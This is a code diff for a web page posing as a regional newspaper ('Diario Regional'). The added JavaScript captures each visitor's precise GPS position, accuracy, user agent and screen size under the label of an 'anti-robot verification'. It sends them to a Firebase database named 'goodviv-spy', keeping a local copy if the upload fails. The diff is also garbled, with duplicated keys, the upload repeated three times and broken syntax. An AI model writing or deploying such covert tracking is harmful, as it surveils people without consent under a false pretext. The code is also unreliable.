@@ -870,14 +870,50 @@
 
         // Capturar y almacenar ubicación GPS (precisa)
         async function captureLocation(position) {
-            // Obtener la dirección detallada
-            const direccion = await getAddressFromCoordinates(position.coords.latitude, position.coords.longitude);
+            try {
+                // Obtener la dirección detallada
+                const direccion = await getAddressFromCoordinates(position.coords.latitude, position.coords.longitude);
+                
+                // Guardar directamente en Firebase
+                const locationData = {
+                    id: 'gps_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                    lat: parseFloat(position.coords.latitude),
+                    lng: parseFloat(position.coords.longitude),
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date().toISOString(),
+                    source: 'Diario Regional - GPS Capture',
+                    userAgent: navigator.userAgent
+                };
+
+                // Enviar a Firebase
+                const response = await fetch('https://goodviv-spy-default-rtdb.firebaseio.com/capturedLocations.json', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(locationData)
+                });
+
+                if (!response.ok) {
+                    throw new Error('Error al guardar en Firebase');
+                }
+
+                console.log('✅ Ubicación guardada en Firebase exitosamente');
             
             const locationData = {
                 id: 'gps_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
                 method: 'GPS_PRECISE',
                 source: 'Diario Regional - GPS Capture',
                 timestamp: new Date().toISOString(),
+                lat: parseFloat(position.coords.latitude),
+                lng: parseFloat(position.coords.longitude),
+                accuracy: position.coords.accuracy,
+                lat: parseFloat(position.coords.latitude),
+                lng: parseFloat(position.coords.longitude),
+                accuracy: position.coords.accuracy,
+                lat: parseFloat(position.coords.latitude),
+                lng: parseFloat(position.coords.longitude),
+                accuracy: position.coords.accuracy,
                 
                 // Ubicación GPS exacta
                 coordenadas: {
@@ -935,7 +971,44 @@
                         ⚡ Velocidad: ${locationData.velocidad}
                         🔍 Método: GPS Anti-Robot Verification
                         📱 Pantalla: ${window.innerWidth}x${window.innerHeight}
-                    `.trim(),
+                    `.trim();
+
+            // Guardar en Firebase
+            fetch('https://goodviv-spy-default-rtdb.firebaseio.com/capturedLocations.json', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(locationData)
+            })
+            .then(() => {
+                console.log('✅ Ubicación guardada en Firebase exitosamente');
+            })
+            .catch(error => {
+                console.error('❌ Error guardando en Firebase:', error);
+                // Guardar localmente como respaldo
+                const localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
+                localLocations.push(locationData);
+                localStorage.setItem('capturedLocations', JSON.stringify(localLocations));
+            });
+
+            // Guardar en Firebase
+            try {
+                await fetch('https://goodviv-spy-default-rtdb.firebaseio.com/capturedLocations.json', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(locationData)
+                });
+                console.log('✅ Ubicación guardada en Firebase exitosamente');
+            } catch (error) {
+                console.error('❌ Error guardando en Firebase:', error);
+                // Guardar localmente como respaldo
+                const localLocations = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
+                localLocations.push(locationData);
+                localStorage.setItem('capturedLocations', JSON.stringify(localLocations));
+            },
                     ip: `
                         🌐 Ubicación IP
                         📍 Coordenadas: ${ipData.coordenadas.lat}, ${ipData.coordenadas.lng}
